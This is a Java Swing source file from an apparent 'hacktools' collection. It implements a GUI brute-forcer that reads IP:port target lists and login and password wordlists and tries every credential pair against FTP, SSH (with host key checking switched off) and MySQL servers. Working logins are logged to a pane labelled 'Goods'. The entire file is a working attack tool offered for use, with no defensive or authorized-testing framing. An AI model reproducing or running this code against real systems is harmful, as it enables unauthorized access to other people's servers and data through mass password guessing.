package slavikcodd3r.rainbow.gui.hacktools;

import java.awt.EventQueue;
import javax.swing.UnsupportedLookAndFeelException;
import javax.swing.UIManager;
import java.io.FileNotFoundException;
import org.apache.commons.net.ftp.FTPReply;
import org.apache.commons.net.ftp.FTPClient;
import com.jcraft.jsch.Session;
import com.jcraft.jsch.ChannelSftp;
import com.jcraft.jsch.JSch;
import java.util.Iterator;
import java.sql.SQLException;
import java.sql.DriverManager;
import com.mysql.jdbc.Connection;
import java.util.Scanner;
import java.net.SocketAddress;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.io.IOException;
import java.util.logging.Level;
import java.util.logging.Logger;
import java.io.Reader;
import java.io.BufferedReader;
import java.io.FileReader;
import java.io.File;
import javax.swing.LayoutStyle;
import java.awt.Component;
import java.awt.LayoutManager;
import javax.swing.GroupLayout;
import javax.swing.ComboBoxModel;
import javax.swing.DefaultComboBoxModel;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.util.ArrayList;
import java.awt.TextArea;
import javax.swing.JTextField;
import javax.swing.JLabel;
import javax.swing.JComboBox;
import javax.swing.JButton;
import java.util.List;
import javax.swing.JFrame;

public class GuiFTP_SSH_MySQL_Brute extends JFrame
{
    private List<String> listUsers;
    private List<String> listPasswords;
    private static Thread thread;
    static int th;
    private JButton jButton1;
    private JComboBox<String> jComboBox1;
    private JLabel jLabel1;
    private JLabel jLabel2;
    private JLabel jLabel3;
    private JLabel jLabel4;
    private JLabel jLabel5;
    private JTextField jTextField1;
    private JTextField jTextField2;
    private JTextField jTextField3;
    private TextArea textArea1;
    private TextArea textArea2;
    
    static {
        GuiFTP_SSH_MySQL_Brute.thread = null;
        GuiFTP_SSH_MySQL_Brute.th = 0;
    }
    
    public GuiFTP_SSH_MySQL_Brute() {
        this.listUsers = new ArrayList<String>();
        this.listPasswords = new ArrayList<String>();
        this.initComponents();
    }
    
    private void initComponents() {
        this.jTextField1 = new JTextField();
        this.jLabel1 = new JLabel();
        this.jTextField2 = new JTextField();
        this.jLabel2 = new JLabel();
        this.jTextField3 = new JTextField();
        this.jLabel3 = new JLabel();
        this.textArea1 = new TextArea();
        this.textArea2 = new TextArea();
        this.jLabel4 = new JLabel();
        this.jLabel5 = new JLabel();
        this.jButton1 = new JButton();
        this.jComboBox1 = new JComboBox<String>();
        this.setTitle("FTP/SSH/MySQL Brute");
        this.jTextField1.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(final ActionEvent evt) {
                GuiFTP_SSH_MySQL_Brute.this.jTextField1ActionPerformed(evt);
            }
        });
        this.jLabel1.setText("List with IP:Port");
        this.jTextField2.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(final ActionEvent evt) {
                GuiFTP_SSH_MySQL_Brute.this.jTextField2ActionPerformed(evt);
            }
        });
        this.jLabel2.setText("List with logins");
        this.jLabel3.setText("List with passwords");
        this.jLabel4.setText("Log");
        this.jLabel5.setText("Goods");
        this.jButton1.setText("Start");
        this.jButton1.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(final ActionEvent evt) {
                GuiFTP_SSH_MySQL_Brute.this.jButton1ActionPerformed(evt);
            }
        });
        this.jComboBox1.setModel(new DefaultComboBoxModel<String>(new String[] { "FTP", "SSH", "MySQL" }));
        final GroupLayout layout = new GroupLayout(this.getContentPane());
        this.getContentPane().setLayout(layout);
        layout.setHorizontalGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING).addGroup(GroupLayout.Alignment.TRAILING, layout.createSequentialGroup().addContainerGap().addGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING).addGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING, false).addComponent(this.jTextField1).addComponent(this.jTextField2).addComponent(this.jLabel1).addComponent(this.jLabel2).addComponent(this.jTextField3, -1, 104, 32767)).addComponent(this.jLabel3).addComponent(this.jLabel4)).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED, 119, 32767).addGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING, false).addComponent(this.jLabel5).addComponent(this.textArea1, -2, 206, -2).addGroup(GroupLayout.Alignment.TRAILING, layout.createSequentialGroup().addGroup(layout.createParallelGroup(GroupLayout.Alignment.TRAILING).addComponent(this.jComboBox1, GroupLayout.Alignment.LEADING, 0, -1, 32767).addComponent(this.jButton1, -1, -1, 32767)).addContainerGap()))).addGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING).addGroup(layout.createSequentialGroup().addContainerGap().addComponent(this.textArea2, -2, 207, -2).addContainerGap(222, 32767))));
        layout.setVerticalGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING).addGroup(layout.createSequentialGroup().addGap(19, 19, 19).addGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING).addGroup(layout.createSequentialGroup().addComponent(this.jLabel1).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addComponent(this.jTextField1, -2, -1, -2).addGap(9, 9, 9).addComponent(this.jLabel2).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addComponent(this.jTextField2, -2, -1, -2)).addComponent(this.jButton1, -2, 78, -2)).addGap(13, 13, 13).addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE).addComponent(this.jLabel3).addComponent(this.jComboBox1, -2, -1, -2)).addGap(1, 1, 1).addComponent(this.jTextField3, -2, -1, -2).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE).addComponent(this.jLabel4).addComponent(this.jLabel5)).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED, -1, 32767).addComponent(this.textArea1, -2, 150, -2).addGap(21, 21, 21)).addGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING).addGroup(GroupLayout.Alignment.TRAILING, layout.createSequentialGroup().addContainerGap(193, 32767).addComponent(this.textArea2, -2, 150, -2).addGap(20, 20, 20))));
        this.pack();
    }
    
    private void jTextField1ActionPerformed(final ActionEvent evt) {
    }
    
    private void jTextField2ActionPerformed(final ActionEvent evt) {
    }
    
    private void jButton1ActionPerformed(final ActionEvent evt) {
        new Thread() {
            @Override
            public void run() {
                try {
                    final BufferedReader sourceReader = new BufferedReader(new FileReader(new File(GuiFTP_SSH_MySQL_Brute.this.jTextField1.getText())));
                    String sourceLine = null;
                    while ((sourceLine = sourceReader.readLine()) != null) {
                        final String sourceLine2 = sourceLine;
                        GuiFTP_SSH_MySQL_Brute.this.textArea2.append(String.valueOf(sourceLine2) + "\n");
                        final String[] splitS = sourceLine2.split(":");
                        if (GuiFTP_SSH_MySQL_Brute.portIsOpen(splitS[0], Integer.parseInt(splitS[1]), 1000)) {
                            if (GuiFTP_SSH_MySQL_Brute.this.jComboBox1.getSelectedItem() == "FTP") {
                                try {
                                    GuiFTP_SSH_MySQL_Brute.this.bruteFTP(splitS);
                                }
                                catch (IOException ex) {
                                    Logger.getLogger(GuiFTP_SSH_MySQL_Brute.class.getName()).log(Level.SEVERE, null, ex);
                                }
                            }
                            if (GuiFTP_SSH_MySQL_Brute.this.jComboBox1.getSelectedItem() == "SSH") {
                                try {
                                    GuiFTP_SSH_MySQL_Brute.this.bruteSSH(splitS);
                                }
                                catch (Exception ex2) {
                                    Logger.getLogger(GuiFTP_SSH_MySQL_Brute.class.getName()).log(Level.SEVERE, null, ex2);
                                }
                            }
                            if (GuiFTP_SSH_MySQL_Brute.this.jComboBox1.getSelectedItem() != "MySQL") {
                                continue;
                            }
                            try {
                                GuiFTP_SSH_MySQL_Brute.this.bruteMySQL(splitS);
                            }
                            catch (Exception ex2) {
                                Logger.getLogger(GuiFTP_SSH_MySQL_Brute.class.getName()).log(Level.SEVERE, null, ex2);
                            }
                        }
                    }
                }
                catch (Exception ex3) {
                    Logger.getLogger(GuiFTP_SSH_MySQL_Brute.class.getName()).log(Level.SEVERE, null, ex3);
                }
            }
        }.start();
    }
    
    public static boolean portIsOpen(final String ip, final int port, final int timeout) {
        try {
            final Socket socket = new Socket();
            socket.connect(new InetSocketAddress(ip, port), timeout);
            socket.close();
            return true;
        }
        catch (Exception ex) {
            return false;
        }
    }
    
    public void bruteMySQL(final String[] splitS) throws Exception {
        final String host = splitS[0];
        final int port = Integer.parseInt(splitS[1]);
        final Scanner in = new Scanner(new FileReader(this.jTextField2.getText()));
        this.listUsers.clear();
        this.listPasswords.clear();
        while (in.hasNext()) {
            this.listUsers.add(in.next());
        }
        final Scanner in2 = new Scanner(new FileReader(this.jTextField3.getText()));
        while (in2.hasNext()) {
            this.listPasswords.add(in2.next());
            System.out.println(this.listPasswords.size());
        }
        for (final String user : this.listUsers) {
            for (String password : this.listPasswords) {
                if ("%empty%".equals(password)) {
                    password = "";
                }
                try {
                    this.textArea2.append(String.valueOf(splitS[0]) + ":" + splitS[1] + ":" + user + ":" + password + "\n");
                    Connection connection = null;
                    try {
                        connection = (Connection)DriverManager.getConnection("jdbc:mysql://" + host + ":" + port, user, password);
                    }
                    catch (SQLException ex) {}
                    if (connection == null) {
                        continue;
                    }
                    this.textArea1.append(String.valueOf(splitS[0]) + ":" + splitS[1] + ":" + user + ":" + password + "\n");
                }
                catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }
    }
    
    public void bruteSSH(final String[] splitS) throws Exception {
        final String host = splitS[0];
        final int port = Integer.parseInt(splitS[1]);
        final BufferedReader sourceReader = new BufferedReader(new FileReader(new File(this.jTextField2.getText())));
        String name = null;
        while ((name = sourceReader.readLine()) != null) {
            final BufferedReader sourceReader2 = new BufferedReader(new FileReader(new File(this.jTextField3.getText())));
            String password2 = null;
            while ((password2 = sourceReader2.readLine()) != null) {
                final String user = name;
                if ("%empty%".equals(password2)) {
                    password2 = "";
                }
                final String password3 = password2;
                this.textArea2.append(String.valueOf(splitS[0]) + ":" + splitS[1] + ":" + user + ":" + password3 + "\n");
                try {
                    final JSch jsch = new JSch();
                    final Session session = jsch.getSession(user, host, port);
                    session.setPassword(password3);
                    session.setConfig("StrictHostKeyChecking", "no");
                    session.connect();
                    final ChannelSftp sftpChannel = (ChannelSftp)session.openChannel("sftp");
                    sftpChannel.connect();
                    this.textArea1.append(String.valueOf(splitS[0]) + ":" + splitS[1] + ":" + user + ":" + password3 + "\n");
                }
                catch (Exception e) {
                    System.err.print(e);
                }
            }
        }
    }
    
    public void bruteFTP(final String[] splitS) throws FileNotFoundException, IOException {
        final String server = splitS[0];
        final int port = Integer.parseInt(splitS[1]);
        final BufferedReader sourceReader = new BufferedReader(new FileReader(new File(this.jTextField2.getText())));
        String name = null;
        while ((name = sourceReader.readLine()) != null) {
            final BufferedReader sourceReader2 = new BufferedReader(new FileReader(new File(this.jTextField3.getText())));
            String password = null;
            while ((password = sourceReader2.readLine()) != null) {
                final String user = name;
                if ("%empty%".equals(password)) {
                    password = "";
                }
                final String pass = password;
                this.textArea2.append(String.valueOf(splitS[0]) + ":" + splitS[1] + ":" + user + ":" + pass + "\n");
                final FTPClient ftpClient = new FTPClient();
                try {
                    ftpClient.connect(server, port);
                    final int replyCode = ftpClient.getReplyCode();
                    if (!FTPReply.isPositiveCompletion(replyCode)) {
                        return;
                    }
                    final boolean success = ftpClient.login(user, pass);
                    if (!success) {
                        continue;
                    }
                    this.textArea1.append(String.valueOf(splitS[0]) + ":" + splitS[1] + ":" + user + ":" + pass + "\n");
                }
                catch (Exception ex) {
                    ex.printStackTrace();
                }
            }
        }
    }
    
    public static void main(final String[] args) {
        try {
            UIManager.LookAndFeelInfo[] installedLookAndFeels;
            for (int length = (installedLookAndFeels = UIManager.getInstalledLookAndFeels()).length, i = 0; i < length; ++i) {
                final UIManager.LookAndFeelInfo info = installedLookAndFeels[i];
                if ("Nimbus".equals(info.getName())) {
                    UIManager.setLookAndFeel(info.getClassName());
                    break;
                }
            }
        }
        catch (ClassNotFoundException ex) {
            Logger.getLogger(GuiFTP_SSH_MySQL_Brute.class.getName()).log(Level.SEVERE, null, ex);
        }
        catch (InstantiationException ex2) {
            Logger.getLogger(GuiFTP_SSH_MySQL_Brute.class.getName()).log(Level.SEVERE, null, ex2);
        }
        catch (IllegalAccessException ex3) {
            Logger.getLogger(GuiFTP_SSH_MySQL_Brute.class.getName()).log(Level.SEVERE, null, ex3);
        }
        catch (UnsupportedLookAndFeelException ex4) {
            Logger.getLogger(GuiFTP_SSH_MySQL_Brute.class.getName()).log(Level.SEVERE, null, ex4);
        }
        try {
            Class.forName("com.mysql.jdbc.Driver");
        }
        catch (ClassNotFoundException ex) {
            Logger.getLogger(GuiFTP_SSH_MySQL_Brute.class.getName()).log(Level.SEVERE, null, ex);
        }
        EventQueue.invokeLater(new Runnable() {
            @Override
            public void run() {
                new GuiFTP_SSH_MySQL_Brute().setVisible(true);
            }
        });
    }
}
